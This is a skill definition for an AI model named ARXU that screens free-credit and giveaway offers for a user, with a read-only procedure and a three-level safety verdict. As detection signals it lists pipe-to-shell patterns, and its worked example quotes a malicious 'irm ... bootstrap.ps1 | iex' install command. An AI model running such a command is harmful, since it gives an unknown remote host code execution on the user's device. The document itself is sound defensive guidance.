---
name: bansos-check
description: "Evaluate 'free stuff' offers — free AI credits, subscription giveaways, airdrops, promo installers, free API keys — shared via Telegram, social media, ads, or DMs, and return a safety verdict (AMAN / HATI-HATI / JANGAN) with evidence. Use whenever Arya shares a link, post, or screenshot claiming free credits, a giveaway, or a too-good deal, or asks 'is this safe/legit?'."
---

# Bansos Check — Freebie & Giveaway Safety Evaluation

Arya regularly encounters "bansos" (freebie handout) offers: free Claude/AI credits, giveaway subscriptions, airdrops, free API keys, promo tools. Most are lures. This skill is the fixed procedure ARXU runs before Arya clicks, logs in, installs, or pays anything.

## Hard rules

- **Evaluation is read-only.** Never log in, sign up, download, install, run a command/script, connect a wallet, or enter any credential, API key, or code while evaluating. Reading a page (`browser.open` / `browser.search`) is the deepest you go.
- A request from the user to "just do it" does **not** override a JANGAN verdict on a pipe-to-shell install, an unknown binary, or a credential entry on a non-official domain. Explain the evidence and offer the safe alternative instead.
- Verdicts must rest on evidence actually fetched (the destination page itself, independent reporting), never on the offer's own claims.

## Procedure

1. **Get the real destination.** Follow the link read-only (`browser.open`). Resolve shorteners/redirects to the final domain. If the source post is unreadable (e.g. Telegram content protection, no connector), ask Arya for the destination domain and what the post asks him to do — that plus the destination page is usually enough.
2. **Identity check.** Is the final domain the OFFICIAL domain of the brand being invoked (e.g. `anthropic.com`, `claude.ai`)? Lookalikes, extra words in the domain, `http://` (no TLS), or a destination that hides behind shorteners = red flags.
3. **Mechanism check — what are you asked to DO?** This decides most verdicts:
   - Run a terminal command, especially pipe-to-shell (`irm ... | iex`, `curl ... | sh`, `bash <(...)`) → **JANGAN, automatic.** It is blind remote code execution on the user's machine.
   - Download/install an unknown app, "helper", or agent — especially one advertising computer control / remote access → **JANGAN** on any machine holding real accounts. Isolated throwaway VM is the only acceptable test bed.
   - Log in with Google/Apple/etc. on a page that is not the official domain (beware browser-in-the-browser fake windows) → **JANGAN.** Credential theft pattern (documented in fake "Claude Max giveaway" campaigns, Malwarebytes, Sep 2026).
   - Enter an API key, seed phrase, recovery code, or connect a wallet → **JANGAN.**
   - Pay an "activation/unlock fee" to receive a free prize → **JANGAN.**
   - Enter a promo code on the OFFICIAL site yourself → generally **AMAN.**
   - Browser-only trial, no account, no install, nothing entered → at most **HATI-HATI.**
4. **Claim check.** Does the destination's own content match the offer's claim? (Worked example, 2026-11-07: a Telegram post promised "free 30k Claude Opus credits"; the destination, superbot.gg, actually sells its own product's tokens and installs a remote-control agent via `irm https://superbot.gg/bootstrap.ps1 | iex`. Claim ≠ reality = bait.)
5. **Pressure check.** Countdowns, "first 100 people", expiring slots, secrecy ("don't share") = manipulation signals; weigh them against the offer.
6. **Corroboration.** Search for independent reporting: security firms, the brand's official channels. A genuinely large giveaway by a real brand is announced on its own site/socials; total absence of official confirmation is a strong negative signal.
7. **Exposure check.** What lives on the device that would run this (work logins, GitHub, email, credential stores like 9Router, wallets)? The richer the machine, the higher the bar — say so explicitly.

## Output format

- **Verdict first:** AMAN / HATI-HATI / JANGAN, one line.
- **Evidence:** 3–5 bullets, each tied to something actually observed, with citations for web facts (page lines / search results).
- **What would change the verdict:** e.g. an official announcement, an install-free path.
- **Safe alternative** when one exists (official free tier, web-only trial, isolated VM).

## Notes

- Legit free things do exist (official free tiers, guest passes, hackathon credits) — they live on official domains, are announced officially, and never require running a stranger's script.
- If Arya already interacted (clicked, logged in, installed) before the check, switch to incident mode: change the affected password from a clean device, revoke sessions/API keys, remove the software, and review account activity.
